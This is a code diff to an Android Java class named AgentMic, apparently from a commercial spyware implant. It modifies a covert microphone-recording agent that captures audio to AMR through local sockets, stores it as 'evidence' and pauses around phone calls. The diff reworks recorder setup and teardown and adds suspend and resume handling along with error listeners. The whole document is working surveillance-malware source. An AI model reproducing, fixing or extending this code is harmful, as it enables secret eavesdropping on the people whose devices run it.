@@ -12,6 +12,8 @@ import java.io.IOException;
 import java.io.InputStream;
 
 import android.media.MediaRecorder;
+import android.media.MediaRecorder.OnErrorListener;
+import android.media.MediaRecorder.OnInfoListener;
 import android.net.LocalServerSocket;
 import android.net.LocalSocket;
 import android.net.LocalSocketAddress;
@@ -61,7 +63,7 @@ import com.ht.RCSAndroidGUI.util.Utils;
  *       they were in the previous recipe for playback.
  * @author zeno
  */
-public class AgentMic extends AgentBase implements Observer<Call> {
+public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListener, OnInfoListener {
 
 	private static final long MIC_PERIOD = 5000;
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
@@ -83,6 +85,7 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 	private String socketname;
 
 	boolean phoneListening;
+	private boolean resuming;
 
 	/*
 	 * (non-Javadoc)
@@ -97,10 +100,7 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 
 			addPhoneListener();
 
-			recorder = new MediaRecorder();
-
-			final DateTime dateTime = new DateTime();
-			fId = dateTime.getFiledate();
+			// recorder = new MediaRecorder();
 
 			startRecorder();
 			Log.d("QZ", TAG + "started");
@@ -124,14 +124,11 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 	public void end() {
 		Log.d("QZ", TAG + " (end)");
 		Check.requires(status == StateRun.STOPPING, "state not STOPPING");
-		if(!isSuspended()){
-			removePhoneListener();
-		}
+
+		removePhoneListener();
 
 		saveRecorderEvidence();
 		stopRecorder();
-		recorder.release();
-		recorder = null;
 
 		Log.d("QZ", TAG + " (ended)");
 
@@ -145,8 +142,8 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 	@Override
 	public void go() {
 		Check.requires(status == StateRun.STARTED, "inconsistent status");
-		int amp = recorder.getMaxAmplitude();
 
+		int amp = recorder.getMaxAmplitude();
 		if (amp != 0) {
 			Log.d("QZ", TAG + " (go): max amplitude=" + amp);
 		}
@@ -161,7 +158,7 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 
 		if (Status.self().crisisMic()) {
 			Log.d("QZ", TAG + "crisis!");
-			AgentManager.self().suspend(this);
+			suspend();
 		}
 
 	}
@@ -274,8 +271,13 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 		Log.d("QZ", TAG + " (startRecorder)");
 		numFailures = 0;
 
-		createSockets();
+		final DateTime dateTime = new DateTime();
+		fId = dateTime.getFiledate();
 
+		createSockets();
+		recorder = new MediaRecorder();
+		recorder.setOnErrorListener(this);
+		recorder.setOnInfoListener(this);
 		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
 		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
@@ -314,7 +316,7 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 		}
 	}
 
-	// SNIPPET
+	// http://sipdroid.googlecode.com/svn/trunk/src/org/sipdroid/sipua/ui/VideoCamera.java
 	/**
 	 * Stop recorder.
 	 */
@@ -323,23 +325,18 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 
 		Log.d("QZ", TAG + " (stopRecorder)");
 
+		recorder.setOnErrorListener(null);
+		recorder.setOnInfoListener(null);
+        
 		recorder.stop();
 		recorder.reset(); // You can reuse the object by going back to
 							// setAudioSource() step
 		// recorder.release(); // Now the object cannot be reused
 		getAvailable();
-
-		try {
-			sender.close();
-			receiver.close();
-			lss.close();
-		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-			Log.d("QZ", TAG + " (stopRecorder) Error: " + e);
-		}
-
 		deleteSockets();
+
+		recorder.release();
+		recorder = null;
 
 	}
 
@@ -365,12 +362,47 @@ public class AgentMic extends AgentBase implements Observer<Call> {
 	public int notification(Call call) {
 		if (call.isOngoing()) {
 			Log.d("QZ", TAG + " (notification): call incoming, suspend");
-			AgentManager.self().suspend(this);
+			suspend();
 		} else {
 			Log.d("QZ", TAG + " (notification): ");
-			AgentManager.self().resume(this);
+			resume();
 		}
 
 		return 1;
+	}
+
+	@Override
+	public void suspend() {
+		if (!isSuspended()) {
+			super.suspend();
+			saveRecorderEvidence();
+			stopRecorder();
+			Log.d("QZ", TAG + " (suspended)");
+		}
+	}
+
+	@Override
+	public void resume() {
+		if (isSuspended()) {
+			try {
+				startRecorder();
+			} catch (IllegalStateException e) {
+				Log.d("QZ", TAG + " (resume) Error: " + e);
+			} catch (IOException e) {
+				Log.d("QZ", TAG + " (resume) Error: " + e);
+			}
+
+			super.resume();
+			Log.d("QZ", TAG + " (resumed)");
+		}
+
+	}
+
+	public void onInfo(MediaRecorder mr, int what, int extra) {
+		Log.d("QZ", TAG + " (onInfo): " + what);
+	}
+
+	public void onError(MediaRecorder mr, int what, int extra) {
+		Log.d("QZ", TAG + " (onError) Error: " + what);
 	}
 }
